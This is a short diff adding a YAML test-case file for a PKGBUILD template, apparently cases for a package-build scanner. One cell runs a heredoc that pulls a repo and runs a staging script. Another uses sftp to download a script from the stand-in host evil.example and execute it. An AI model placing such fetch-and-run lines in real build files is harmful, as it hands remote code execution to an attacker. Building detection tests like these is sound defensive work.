@@ -1,0 +1,15 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |2
+        bash <<'EOS'
+      cd "$srcdir/harness-baseline-1.0.0"
+      git pull
+      bash stage.sh
+      EOS
+  id: 002-heredoc-shell-gitpull
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /s.sh"
+        exec bash s.sh
+  id: 014-exec-exec-cmd
